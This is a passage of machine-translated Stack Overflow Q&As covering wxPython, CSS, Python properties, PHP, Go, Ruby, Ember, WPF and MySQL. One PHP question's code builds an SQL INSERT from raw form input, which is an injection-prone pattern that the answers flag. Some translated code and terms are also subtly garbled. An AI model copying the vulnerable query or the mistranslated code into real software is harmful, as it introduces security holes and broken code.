    """Subclass of wx.Button, has the same functionality. 
    Allows user to set Status Bar help by using SetStatusText method.
    """
    current = None

    def __init__(self, *args, **kwargs):
        wx.Button.__init__(self, *args, **kwargs)

    def SetStatusText(self, help_string, status_bar_frame):
        self.help_string = help_string
        self.status_bar_frame = status_bar_frame
        self.Bind(wx.EVT_ENTER_WINDOW, self._ShowHelp)
        self.Bind(wx.EVT_LEAVE_WINDOW, self._HideHelp)       

    def _ShowHelp(self, e):
        TipButton.current = self.GetLabel()
        self.status_bar_frame.SetStatusText(self.help_string)

    def _HideHelp(self, e):
        if self.GetLabel() == TipButton.current:
            self.status_bar_frame.SetStatusText("")        

class MainWindow(wx.Frame):
    def __init__(self, *args, **kwargs):
        wx.Frame.__init__(self, *args, **kwargs)

        self.CreateStatusBar()

        self.panel = wx.Panel(self)
      # Instead of 
      # self.button1 = wx.Button(self.panel, label="Test1", size=(150, 50))
        self.button1 = TipButton(self.panel, label="Test1", size=(150, 50))
        self.button1.SetStatusText("This is for testing purposes", self)
        self.button1.SetFont(wx.Font(14, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, u'Consolas'))

      # Instead of 
      # self.button2 = wx.Button(self.panel, label="Test2", size=(150, 50))
        self.button2 = TipButton(self.panel, label="Test2", size=(150, 50))
        self.button2.SetStatusText("This is jusst for fun!", self)
        self.button2.SetFont(wx.Font(14, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, u'Consolas'))

        self.sizer = wx.BoxSizer()
        self.sizer.Add(self.button1)
        self.sizer.Add(self.button2)

        self.panel.SetSizerAndFit(self.sizer)  
        self.Show()      

app = wx.App(False)
win = MainWindow(None)
app.MainLoop() 
```

# c# - 获取登录用户 SID 而不是提升的用户

> ID：14916263
> 
> 赞同：3
> 
> 时间：2013-02-16T23:22:37.257
> 
> 标签：c#, .net, winforms, sid

如何在提升的 .NET 应用程序中获取登录用户 SID？

我已经尝试过`WindowsIdentity.GetCurrent()`哪个当然会返回提升进程的管理员。从我所见，我可能需要使用本机方法来做到这一点，任何人都可以提供更优雅的方式吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T05:37:12.817

调查[Greg](https://stackoverflow.com/users/1288589/greg)关于使用注册表的建议：

我发现以下密钥在提供当前登录的用户信息方面看起来很可靠。该键包括显示名称和 SID 等信息。此信息存储在“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI”下

此信息在 Windows 8 上是准确的。我检查过 Windows 7 并且包含的​​信息要少得多，例如：没有登录用户 SID。

# build - 将 googles v8 构建为 Windows 上的共享库？

> ID：14916272
> 
> 赞同：8
> 
> 时间：2013-02-16T23:25:06.797
> 
> 标签：build, v8, gyp

是否可以在 Windows (msvc 2012) 上使用 gyp 将 googles v8 构建为共享库？我尝试的一切都不起作用。我试过的：

```
python build\gyp_v8 -Dcomponent=shared_library
python build\gyp_v8 library=shared 
```

第二个给出“库”未知的错误。第一个没有任何影响。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T03:05:02.573

这适用于我正在使用的项目：

```
python build\gyp_v8 -Dtarget_arch=ia32 -Dcomponent=shared_library
msbuild /p:Configuration=Release /p:Platform=Win32 tools\gyp\v8.sln 
```

# css - 为什么“更轻”@font-face 仍然显示为“正常”重量@font-face

> ID：14916276
> 
> 赞同：12
> 
> 时间：2013-02-16T23:25:40.700
> 
> 标签：css, fonts, font-face

我正在尝试使用字体的“较轻”版本，但在 Firefox 和 chrome 中，它仍然显示为“正常”重量。

这是我的 font.css：

```
@font-face {
font-family: Avenir;
font-weight: normal;
src: url("AvenirLTStd-Medium.otf") format("opentype");
}

@font-face {
font-family: Avenir;
font-weight: bold;
src: url("AvenirLTStd-Black.otf") format("opentype");
}

@font-face {
font-family: Avenir;
font-weight: lighter;
src: url("12-Avenir-Light.ttf") format("opentype");
} 
```

这是我用来激活“更轻”重量的`H2`方法`#home`：

```
body {
    background: none repeat scroll 0 0 #DADAD2;
    font-family: 'Avenir',sans-serif;
    font-weight: normal;
}

#home .six.columns h2 {
    color: #FAFAFA;
    display: block;
    font-size: 1.8em;
    font-weight: lighter;
    letter-spacing: 0.3em;
    margin-top: 25%;
    text-align: center;
} 
```

您可以在这里看到我在说什么（只需将鼠标悬停在其中一张产品图片上）：

[https://fine-grain-2.myshopify.com/](https://fine-grain-2.myshopify.com/)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2015-10-12T15:43:32.357

`font-weight: lighter`告诉浏览器使用比继承权重更轻的字体。因此，如果父元素具有`font-weight: bold`，并且它的子元素具有`font-weight: lighter`- 子元素将具有常规重量（即比粗体轻）。“更轻”*不是*字体粗细为 100 的同义词。

`@font-face`用于定义字体粗细，因此“粗体”和“更轻”等术语没有任何意义。当您想使用字体时，您应该使用数值来定义您的字体和较亮/较粗的关键字。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2015-11-09T18:04:22.483

如果您想保持字体系列一致，在这种情况下是“Avenir”而不是“Avenir-light”，您可以使用以下语法：

```
@font-face {
    font-family: Avenir;
    font-weight: 100;
    src: url("12-Avenir-Light.ttf") format("opentype");
} 
```

此语法允许您保持字体系列名称一致，并且正常重量将正确显示。目标元素的 CSS 将是：

```
.targetElement{
    font-family: Avenir;
    font-weight: lighter;
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-16T23:48:36.103

我发现了一个小技巧，可以区分较轻和正常的字体粗细。

我刚把我的 Avenir 打火机`@font-face`从：

```
@font-face {
    font-family: Avenir;
    font-weight: lighter;
    src: url("12-Avenir-Light.ttf") format("opentype");
} 
```

到：

```
@font-face {
    font-family: AvenirLight;
    font-weight: normal;
    src: url("12-Avenir-Light.ttf") format("opentype");
} 
```

出于某种原因，它对`normal`and使用了“较轻”的字体粗细`lighter`。在我进行此更改后，`normal`Avenir 开始使用真正的正常重量，当我想使用`lighter`重量时，我只需将 font-family 更改为`AvenirLight`

# java - Java XML拆分行间FRC

> ID：14916282
> 
> 赞同：1
> 
> 时间：2013-02-16T23:26:40.577
> 
> 标签：java, xml, twitter, line, newline

好的，所以，我正在尝试用 Java 解析 XML 文件。Mp>我从提要中得到我需要的行，然后我可以打印它，但我需要将它分成多行。

代码在[这里](https://github.com/20081392/FRCFMSTwitterParse/)可用！

虽然，第 31 行需要更改为

```
 File fXmlFile = new File("https://api.twitter.com/1/statuses/user_timeline.rss?screen_name=frcfms"); 
```

我需要得到它的输出：

```
Tweet : frcfms: #FRCDEV1 TY P MC 6 RF 50 BF 179 RA 5 10 8 BA 4 2 3 RC 30 BC 30 RFP 0 BFP 0 RAS 0 BAS 60 RTS 20 BTS 89 
```

并在每个 2 个字母代码之后将其拆分为一个新行，我想将两个字母代码更改为相应的单词，其文档可[在此处获得](http://www.usfirst.org/sites/default/files/uploadedFiles/Robotics_Programs/FRC/Game_and_Season__Info/2013/2013FMSTwitterFeed_Rev0.pdf)

所以希望它看起来像这样

```
 Tweet : frcfms #EVENT
    TY(pe) : Q(ualification)
    M(atch) C(ount) : ***
    R(ed) F(inal) : ***
    etc... 
```

如果可能的话，避免使用 RegEx 会很好......我真的迷路了，真的很容易

欢迎提交！

# python - 在类对象中，如何自动更新属性？

> ID：14916284
> 
> 赞同：16
> 
> 时间：2013-02-16T23:26:54.033
> 
> 标签：python, class, attributes

我有一个具有多个相关属性的类，例如：

```
class SomeClass：
    def __init__(self, n=0):
        self.list = range(n)
        self.listsquare = [ x**2 for x in self.list ] 
```

如果我通常制作一个没有问题的对象，

```
a = SomeClass(10) 
```

我将获得 2 个列表，`a.list`并且`a.listsquare`.

现在，如果我想先创建一个空对象并为其分配一个属性，我希望其他属性能够自动更新，例如，如果我这样做

```
b = SomeClass()
b.list = range(5,10) 
```

我想`b.listsquare`自动更新，反之亦然（分配`b.listsquare`和自动更新`b.list`）。这可能吗？*Class*是正确的选择吗？

* * *

谢谢大家，但我完全被所有不同的答案所淹没。任何人都可以提供完整的解决方案，以便我可以自己学习编写吗？

我想实现一个`Foo`具有 3 个属性的类`length`，`list`并且`listsquare`这样：

1.  如果我这样做`a = Foo(3)`，我会得到`a.length = 3`, `a.list = [0, 1, 2]`, `a.listsquare = [0, 1, 4]`.
2.  如果我这样做`b = Foo().list = [5, 6]`，我会得到`b.length = 2`，`b.listsquare = [25, 36]`。
3.  如果我这样做`c = Foo().listsquare = [4, 9]`，我会得到`c.length = 2`，`c.list = [2, 3]`。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-02-16T23:53:18.747

如果由于另一个属性的更新而更新一个属性是您正在寻找的（而不是在访问时重新计算下游属性的值）使用属性设置器：

```
class SomeClass(object):
    def __init__(self, n):
        self.list = range(0, n)

    @property
    def list(self):
        return self._list
    @list.setter
    def list(self, val):
        self._list = val
        self._listsquare = [x**2 for x in self._list ]

    @property
    def listsquare(self):
        return self._listsquare
    @listsquare.setter
    def listsquare(self, val):
        self.list = [int(pow(x, 0.5)) for x in val]

>>> c = SomeClass(5)
>>> c.listsquare
[0, 1, 4, 9, 16]
>>> c.list
[0, 1, 2, 3, 4]
>>> c.list = range(0,6)
>>> c.list
[0, 1, 2, 3, 4, 5]
>>> c.listsquare
[0, 1, 4, 9, 16, 25]
>>> c.listsquare = [x**2 for x in range(0,10)]
>>> c.list
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-16T23:34:50.637

绝对地。但请改用**属性**。

```
class SomeClass(object):
  def __init__(self, n=5):
    self.mylist = range(n)

  @property
  def listsquare(self):
    return [ x**2 for x in self.mylist ]

a = SomeClass()
a.mylist = [4, 5, 8]
print a.listsquare 
```

属性值的缓存留给读者作为练习。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-17T00:11:41.617

Ignacio 的@property 解决方案很棒，但它会在您每次引用 listsquare 时重新计算列表——这可能会变得很昂贵。Mathew 的解决方案很棒，但是现在您有了函数调用。您可以将这些与“属性”功能结合使用。在这里，我为生成 listsquare 的 my_list 定义了一个 getter 和一个 setter（我只是不能称它为“list”！）：

```
class SomeClass(object):

    def __init__(self, n=5):
        self.my_list = range(n)

    def get_my_list(self):
        return self._my_list

    def set_my_list(self, val):
        self._my_list = val
        # generate listsquare when my_list is updated
        self.my_listsquare = [x**2 for x in self._my_list]

    # now my_list can be used as a variable
    my_list = property(get_my_list, set_my_list, None, 'this list is squared')

x = SomeClass(3)
print x.my_list, x.my_listsquare
x.my_list = range(10)
print x.my_list, x.my_listsquare 
```

这输出：

```
[0, 1, 2] [0, 1, 4]
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-02-16T23:38:47.580

您也可以只使用 setter 方法，如下所示：

```
class SomeClass:
    def __init__(self, n=5):
        self.set_list(range(n))

    def set_list(self, n):
        self.list = n
        self.listsquare = [ x**2 for x in self.list ]

b = SomeClass()
b.set_list(range(5,10)) 
```

# php - 更新问题 - max_file_uploads

> ID：14916285
> 
> 赞同：1
> 
> 时间：2013-02-16T23:26:56.353
> 
> 标签：php, iis-7

嘿伙计们，我有一个在 winhost 下托管的网站。我有一个 php 函数，可以上传整个 csv 文件。它需要能够上传数千个条目，为了使其正常工作，他们告诉我更改`max_file_uploads`and `max_execution_time`. 他们告诉我我可以通过创建一个 user.ini 文件来做到这一点，我做了这个并将以下代码放入其中：

```
max_file_uploads = 1000
max_execution_time = 1200 
```

这有效，除了它没有改变file_uploads，它只改变了execution_time。我通过检查我的 phpinfo 部分来确定。他们还说尝试使用 IIS 将 PHP...FastCGI 与 PHP5 切换 - 切换订单列表。我这样做了，但没有成功，它删除了我的 max_file_uploads 并且更改不会让我调整我的 execution_time。

所以回顾一下：我不能更新`max_file_uploads`. 我只能更新`max_execution_time`.

# ruby - Git bash为什么没有安装gem？

> ID：14916289
> 
> 赞同：1
> 
> 时间：2013-02-16T23:27:18.510
> 
> 标签：ruby, git

我正在使用 Windows 7 并安装了 git。在 Git Bash 控制台中，我有 ruby​​ 可用。

当我`bundle install`在 Git bash 中运行时，安装的 gem 不会添加到 gem 列表中。似乎宝石毕竟没有安装。

但是，如果我跑步，`bundle list`我可以看到宝石。这是因为路径不同吗？

为什么 gem 没有安装并添加到 gem 列表中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:39:37.080

`bundle install`在普通命令窗口中运行

# css - LESS 中的负变量

> ID：14916300
> 
> 赞同：10
> 
> 时间：2013-02-16T23:29:48.180
> 
> 标签：css, less

LESS 的新手，我正在尝试使用以下方法将 div 居中：

```
#form_block {
    display: block;
    position: absolute;
    @width: 800px;
    @height: 500px;
    width: @width;
    height: @height;
    top: 50%;
    left: 50%;
    margin-left: -@width/2 px;
    margin-top: -250px; 
```

似乎`margin-top`设置正确，因为它的尺寸明确存在。但是无论我多么努力，我似乎​​都无法接受变量的负数（即-（@width），-1 * @width等）有什么想法吗？这可能只是一个愚蠢的错误。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-02-16T23:33:22.233

我今天早些时候遇到了同样的问题（使用lessphp）。尝试：

```
margin-left: -(@width/2); 
```

（没有`px`）

你还应该对值进行四舍五入：

```
margin-left: -(round(@width/2)); 
```

# c# - 将句柄（HttpApplication）方法从 VB.NET 迁移到 C#？

> ID：14916301
> 
> 赞同：0
> 
> 时间：2013-02-16T23:29:54.267
> 
> 标签：c#, vb.net, events, handles

我正在将一些代码从 VB.NET 迁移到 C# (4.0)。

我发现结构如下：

```
Private Sub WhitePointHttpApplicationBase_BeginRequest(sender As Object, e As System.EventArgs) Handles Me.BeginRequest

End Sub 
```

在 C# 中翻译这种行为最直接的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:08:28.233

在构造函数中添加`this.BeginRequest+=WhitePointHttpApplicationBase_BeginRequest;`

您还需要该方法存在： `private void WhitePointHttpApplicationBase_BeginRequest(sender As Object, e As System.EventArgs) { //Your event code here }`

以下是评论中的代码并进行了更正：

```
namespace WhitePoint.Solutions.Web 
{ 
    public abstract class WhitePointHttpApplicationBase : HttpApplication { 

        protected WhitePointHttpApplicationBase()
        {
            this.BeginRequest += WhitePointHttpApplicationBase_BeginRequest; 
        }
        #region "Member" 
        #endregion 

        private void WhitePointHttpApplicationBase_BeginRequest(object sender, EventArgs e) { } 
    } 
} 
```

`this.BeginRequest +=`不在构造函数中。

抽象类现在是一个默认的受保护构造函数，如果您希望代码运行，任何继承的类都应该调用这个基构造函数。

# php - PHP 表单验证检查现有字段

> ID：14916304
> 
> 赞同：0
> 
> 时间：2013-02-16T23:30:16.993
> 
> 标签：php, html, validation, required-field

目前，如果数据库中存在，用户可以从菜单中选择他们的名字。如果他们的名字不存在，他们可以将他们的名字添加到表单中。

我希望表单检查是否选择了名称。如果尚未选择名称，则用户可以将其名称插入表单中。关于如何做到这一点的任何想法？提前致谢。

```
Form 

<html>  
<head>  
<title>Form Input Data</title> 
</head>
<table>  
<body><table border="1">
<table bgcolor="lightblue"></body>

     <form method="post" action="insert_ac.php"> 
    <br>
<tr><td align="left"><strong>Nurse Information</strong></td></tr>
<tr>
<td><font color="red">Please select your name</font></td>
</tr>
<tr>
<td>Fullname</td>
<td><select name="valuelist">;
<option value="valuelist" name="nurse_name" value='<?php echo $nurse_name;  ?>'></option>
<?php
$value=$_POST ["valuelist"];
$con = mysql_connect("localhost","root","") or die('Could not connect:'.mysql_error());
mysql_select_db("a&e", $con) or die('Could not select database.');

$fetch_nurse_name = mysql_query("SELECT DISTINCT Fullname FROM nurse");

while($throw_nurse_name = mysql_fetch_array($fetch_nurse_name)) {
echo '<option   value=\"'.$throw_nurse_name[0].'">'.$throw_nurse_name[0].'</option>';
 }
 echo "</select>";

?>
</td>
</tr>
<tr>
<td>Please register name here:</td>
<tr>  

        <td>Fullname</td>

       <td><input type="text" name="nurse_forename" size="30"> </td>

     </tr>
 </tr> 
```

PHP

```
 //get NURSE values from form
  $nurse_forename = $_POST['nurse_forename'];
//check ALL fields have values 
if($_POST['nurse_forename']==""){
die('ERROR: Please Register a Nurse');
 }
//insert 
$sql ="INSERT INTO Nurse(Fullname)
VALUES('$nurse_forename')";
mysql_query($sql,$con) or die('Error: ' . mysql_error());
echo "1 record added";
// close connection 
mysql_close($con);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:42:29.563

我不太明白你在上面的 HTML 中获取 $nurse_name 的位置，但我认为它就在那里..

因此，请执行以下操作以选择当前护士姓名：

```
while($throw_nurse_name = mysql_fetch_array($fetch_nurse_name)) {
echo '<option '. ( $throw_nurse_name[0] === $nurse_name ? 'selected="selected"' : '' ) .'  value=\"'.$throw_nurse_name[0].'">'.$throw_nurse_name[0].'</option>';
 }
 echo "</select>"; 
```

哦，我敢肯定，如果您在存储数据库输入之前转义数据库输入，以及在输出数据库输入之前对其进行转义，护士们会很高兴的。

```
//insert 
$sql ="INSERT INTO Nurse(Fullname) VALUES('". mysql_real_escape_string( $nurse_forename ) ."')"; 
```

输出时至少使用[htmlspecialchars()](http://www.php.net/manual/en/function.htmlspecialchars.php)：

```
<option value="valuelist" name="nurse_name" value='<?php echo htmlspecialchars( $nurse_name; )  ?>'></option> 
```

还建议使用[mysqli](http://www.php.net/manual/en/book.mysqli.php)函数而不是 mysql，因为不推荐使用 mysql。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:45:04.830

更新了一些代码（只是一个例子）：

```
<?php

$nurses = array() ;
$nurse_found = false ;
//Get all nurses from the database and store them in the array before the next step

//Print your select input
echo "<select>" ;
foreach ($nurses as $nurse){
  $selected = "" ;  
  if (isset($_POST['nurse_forename']) && $nurse['name']===$_POST['nurse_forename']){
    $nurse_found = true ;
    $selected = "selected" ;
  }
  echo "<option value='{$nurse['name']}' {$selected}>{$nurse['name']}</option>" ;

}
echo "</select"> ;

//NEXT STEP:
//A nurse is not found. If form is submitted, we can add her into database.

if (!$nurse_found && !empty($_POST['nurse_forename'])){
  $name = mysql_real_escape_string($_POST['nurse_forename']) ;
  $query = "INSERT INTO `nurses` VALUES ('{$name}') ; " ;
  $result = mysql_query($query, $mysql_link) ;
  if (mysql_affected_rows($mysql_link) == 1){
    echo "A new nurse has been added" ;
  }
}
?> 
```

一些提示：

*   编写结构良好的代码并将逻辑操作与图形操作分开
*   停止使用 mysql_* 扩展，因为它已被[弃用](http://www.php.net/manual/en/function.mysql-connect.php)。请改用[mysqli](http://www.php.net/manual/en/mysqli.construct.php)或[PDO](http://www.php.net/manual/en/pdo.construct.php)。
*   清理并检查用户输入的所有内容。否则，您的数据库容易受到[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)攻击，您的网站也容易受到[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)攻击。

祝你好运！

# go - xml.Unmarshal 错误：“预期的元素类型 但有 "

> ID：14916307
> 
> 赞同：5
> 
> 时间：2013-02-16T23:30:26.750
> 
> 标签：go

我正在尝试解组以下 XML，但收到错误消息。

```
<ItemSearchResponse xmlns="http://webservices.amazon.com/AWSECommerceService/2011-08-01">
<Items>
<Item>
<ASIN>B005XSS8VC</ASIN>
</Item>
</Items> 
```

这是我的结构：

```
type Product struct {
    XMLName xml.Name `xml:"Item"`
    ASIN    string
}

type Result struct {
    XMLName  xml.Name `xml:"ItemSearchResponse"`
    Products []Product `xml:"Items"`
} 
```

错误的文本是“预期的元素类型`<Item>`但有`<Items>`”，但我看不出哪里出错了。任何帮助表示赞赏。

```
v := &Result{Products: nil}
err = xml.Unmarshal(xmlBody, v) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T10:08:53.530

这对我有用（注意`Items>Item`）：

```
type Result struct {
XMLName       xml.Name `xml:"ItemSearchResponse"`
Products      []Product `xml:"Items>Item"`
}

type Product struct {
    ASIN   string `xml:"ASIN"`
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T02:36:06.837

struct 的结构与 xml 结构不匹配，这是一个工作代码：

```
package main

import (
    "encoding/xml"
    "log"
)

type Product struct {
    ASIN    string   `xml:"ASIN"`
}
type Items struct {
    Products    []Product `xml:"Item"`
}

type Result struct {
    XMLName  xml.Name `xml:"ItemSearchResponse"`
    Items    Items `xml:"Items"`
}

func main() {
    xmlBody := `<ItemSearchResponse xmlns="http://webservices.amazon.com/AWSECommerceService/2011-08-01">
<Items>
<Item>
<ASIN>B005XSS8VC</ASIN>
</Item>
<Item>
<ASIN>C005XSS8VC</ASIN>
</Item>
</Items>`
    v := &Result{}
    err := xml.Unmarshal([]byte(xmlBody), v)
    log.Println(err)
    log.Printf("%+v", v)

} 
```

它将输出：

```
&{XMLName:{Space:http://webservices.amazon.com/AWSECommerceService/2011-08-01 Local:ItemSearchResponse} Products:{Products:[{ASIN:B005XSS8VC} {ASIN:C005XSS8VC}]}} 
```

# ruby - 在 .erb 文件中引用 Ruby 哈希值。如何在浏览器中输出到直接 html 时不显示引号和方括号？

> ID：14916311
> 
> 赞同：2
> 
> 时间：2013-02-16T23:30:43.037
> 
> 标签：ruby, erb

我在 index.html.erb 文件中的代码发布在下面。当我在常规 ruby​​ 文件中进行测试时，我没有在输出中看到任何引号/括号。但是，当我在 erb 文件中使用相同的代码时，在浏览器中查看时，我会看到每个值周围显示引号和方括号。有没有办法解决这个问题？

```
---
title: Coast Guard Quiz
---

<%

seaman_recruit = {

    img: "<img src = 'images/USCG_SR.png'>",
    name: "Seaman Recruit",
    en_class: "Seaman",
    abbr: "SR",
}

seaman_apprentice = {
    img: "<img src = 'images/USCG_SA.png'>",
    name: "Seaman Apprentice",
    en_class: "Seaman",
    abbr: "SA",
}

seaman = {
    img:  "<img src = 'images/USCG_SM.png'>",
    name: "Seaman",
    en_class: "Seaman",
    abbr: "SN",
}

ranks = [seaman_recruit, seaman_apprentice, seaman]

ranks.shuffle!

current_rank = ranks.shuffle!.first

%>

<p><%= current_rank.values_at(:img) %></p>
<p class="bld"><%= current_rank.values_at(:name) %></p>
<p><%= current_rank.values_at(:en_class) %></p>
<p><%= current_rank.values_at(:abbr) %></p>
<p><%= current_rank.values_at(:title) %></p>
<p><%= current_rank.values_at(:paygrade) %></p> 
```

**例如，我看到这个：**

[“（实际图像）”]

[“水手”]

[“水手”]

[“序列号”]

[“海员（姓氏）”]

[“E3”]

**我想看看这个：**

（实际图像）

水手

水手

序列号

海员（姓氏）

E3

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:10:10.653

`.values_at` always returns an array. It will optionally accept multiple arguments and return the corresponding values from the hash. Since you're only giving a single argument, you get an array with one member.

You just want a standard lookup, either using bracket notation (`current_rank[:title]`, etc) or `fetch` (`current_rank.fetch(:title)`). Fetch has the added option of defining a default value to prevent errors when the provided key is not present in the hash: `current_rank.fetch(:key) { 'default value' }`.

ERB is generally not the appropriate place to define data or behavior. Assuming you're using standalone erb templates (not backed by Rails or Sinatra), I would suggest a better option would be to define your templates separate from your ruby code, either in individual files or as strings in a standard ruby file. You can take a look at the [documentation](http://ruby-doc.org/stdlib-1.9.3/libdoc/erb/rdoc/ERB.html) for some examples.

# view - Ember 如何在不影响正常行为的情况下添加额外的命名插座进行查看

> ID：14916312
> 
> 赞同：0
> 
> 时间：2013-02-16T23:30:44.787
> 
> 标签：view, ember.js, outlet

我试图在我的索引页面中呈现三个额外`outlet`的，一切正常，除了一旦我设置了至少一个插座，正常行为就会被打断。在这里更清楚的是我在做什么

我的`IndexRoute`路线

```
renderTemplate: function() {
    this._super();
    this.render('header', { into: 'index', outlet: 'header' });
    this.render('sidebar', { into: 'index', outlet: 'sidebar' });
    this.render('right_side', { into: 'index', outlet: 'right_side' });
} 
```

现在我的路线已被映射，因此`index`是一种资源并包含内部的所有其他路线。我的视图包含所有`outlet`设置为渲染和一个未命名的插座，这会导致问题。

如果我没有明确指定要渲染的内容和位置`IndexRoute`，一切正常，我的模板在我的未命名插座中渲染，链接工作正常，未命名插座获得正确的内容，但是一旦我设置了任何命名插座，未命名插座停止获取任何内容，尽管我正在调用`_super()`.

所以我的问题是如何设置额外的命名插座而不干扰相同的未命名插座的正常工作`resource`？

**更新**

示例 [http://jsfiddle.net/drulia/jM6js/](http://jsfiddle.net/drulia/jM6js/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T18:30:29.123

我不太确定 multiple 的问题是什么`outlets`，但我使用`partial`helper 让它工作。

```
<script type="text/x-handlebars" data-template-name="index">
 {{#linkTo index/foo}}Go to Foo{{/linkTo}} <br>
 {{#linkTo index/bar}}Go to Bar{{/linkTo}} <hr>
 text inside index template
 <hr>
 {{outlet}}
 {{render "sidebar"}}
</script> 
```

这是一个[jsfiddle](http://jsfiddle.net/alex_navasardyan/u422F/)。

**更新**

jsfiddle 已更新为使用`{{render}}`helper 而不是`{{partial}}`.

If you're using `{{partial}}` helper, it will use existing context. If you need to reuse models/controllers, you're better of using `{{render}}` because it creates a new view/controller/template context for you. Then you might use `modelFor` or `controllerFor` hooks.

# .net - 在 ViewModel 中使用 View 中的只读依赖项属性设置属性

> ID：14916313
> 
> 赞同：2
> 
> 时间：2013-02-16T23:30:48.207
> 
> 标签：.net, wpf, data-binding, dependency-properties

我一直在尝试关注[StackOverflow 帖子](https://stackoverflow.com/questions/1122595/how-do-you-create-a-read-only-dependency-property)以及[MSDN 上的官方文档，](http://msdn.microsoft.com/en-us/library/ms754044.aspx)以在 ViewModel 使用的 WPF Canvas 控件的子类上实现只读依赖属性。

我已将 Canvas 的子类定义为：

```
public class LayerCanvas : Canvas
{
    private static readonly DependencyPropertyKey ReadOnlyCursorLocationPropertyKey =
        DependencyProperty.RegisterReadOnly("CursorLocation", typeof(Point), typeof(LayerCanvas),
        new PropertyMetadata(new Point(0, 0)));

    public static readonly DependencyProperty CursorLocationProperty =
        ReadOnlyCursorLocationPropertyKey.DependencyProperty;

    public LayerCanvas()
        : base()
    {

    }

    public Point CursorLocation
    {
        get { return (Point)GetValue(CursorLocationProperty); }
        private set { SetValue(ReadOnlyCursorLocationPropertyKey, value); }
    }

    protected override void OnMouseMove(MouseEventArgs e)
    {
        base.OnMouseMove(e);
        this.CursorLocation = e.GetPosition(this);
    }
} 
```

绑定到 View 的 XAML 中的属性为：

```
<local:LayerCanvas CursorLocation="{Binding Path=CursorLocation, Mode=OneWayToSource}" ... /> 
```

将 ViewModel 中的属性实现为：

```
public Point CursorLocation
{
    get { return this.cursorLocation; }
    set
    {
        this.cursorLocation = value;
        // ... logic ...
    }
} 
```

我收到View 的 XAML 中的错误和我认为可以修复`"CursorLocation cannot be data-bound."`的编译时错误。我正在使用只读依赖属性而不是使用代码隐藏来尝试保持干净的 MVVM 实现。这是正确的方法吗？`"The property 'LayerCanvas.CursorLocation' cannot be set because it does not have an accessible set accessor."``Mode=OneWayToSource`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T10:56:21.517

来自 [MSDN](http://msdn.microsoft.com/en-us/library/ms754044.aspx#existing)：

> 由于不可设置，只读依赖属性不适用于依赖属性通常提供解决方案的许多场景（即：**数据绑定**、可直接设置为值、验证、动画、继承）。

即使您将属性的设置器公开，数据绑定也不起作用。所以答案是否定的，这不是正确的方法。为了支持数据绑定，该属性不能是只读的，即使绑定是`OneWayToSource`唯一的。

# mysql - 添加外键约束时，最佳实践是哪个方向？

> ID：14916315
> 
> 赞同：8
> 
> 时间：2013-02-16T23:31:02.767
> 
> 标签：mysql, database, database-design, relational-database

想象一下，我有三个名为`profiles`和`profiles_skills`的表`skills`。这是一种 HABTM 关系，其中一个配置文件可以具有许多技能，并且一个技能可以属于多个配置文件。

我需要在这些表之间设置外键约束。我的问题是，外键应该是什么方向？例如，我是否这样做：

```
ALTER TABLE profiles_skills ADD FOREIGN KEY (skill_id) REFERENCES skills(id);
ALTER TABLE profiles_skills ADD FOREIGN KEY (profile_id) REFERENCES profiles(id); 
```

还是我这样做：

```
ALTER TABLE profiles ADD FOREIGN KEY (id) REFERENCES profiles_skills(profile_id);  
ALTER TABLE skills ADD FOREIGN KEY (id) REFERENCES profiles_skills(skill_id); 
```

我从来没有真正遵循过约定，我只是按照我输入的方式去做，没有遇到任何问题。但我一直在想，这是否真的很重要。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-18T11:29:14.487

> 我的问题是，外键应该是什么方向？

外键应该在*联结*表 ( `profiles_skills`) 中，引用*端点*表 (`profiles`和`skills`)。

如果您尝试以相反的方式进行操作，您将能够“连接”**不存在的**配置文件和/或技能，这正是外键应该防止的。这也使得无法拥有未连接的个人资料（或技能）。

# asp.net-mvc-4 - 尝试通过索引器解析时，在 CI 中使用 IIndex<,> 的 Autofac MVC4 会抛出 EntryPointNotFoundException

> ID：14916321
> 
> 赞同：1
> 
> 时间：2013-02-16T23:31:35.937
> 
> 标签：asp.net-mvc-4, autofac

我已经设置了下一件事：

一个标记接口、IFormatter、一个通用接口 ITypedFormatter、一个基类 FormatterBase 以及该 FormatterBase 上的一堆实现。

看起来像这样：

```
public interface IFormatter{}
public interface ITypedFormatter<T> : IFormatter {...}
public abstract class FormatterBase<T> : ITypedFormatter<T> {...}

public class SomeFormatter<SomeClass> : FormatterBase<SomeClass> { ... } 
```

我用 autofac 将它们注册为：

```
builder.RegisterType<SomeFormatter>().Keyed<IFormatter>(typeof(SomeClass)); 
```

然后我在另一个类中使用它通过 IIndex 收集它们并在方法中使用它：

```
public class SomeService
{
    public SomeService(IIndex<Type, IFormatter> formatterFactory){...}

    public T Format<T>(T entity)
    {
        var formatter = formatterFactory[typeof (T)];
        var typedFormatter = formatter as ITypedFormatter<T>;
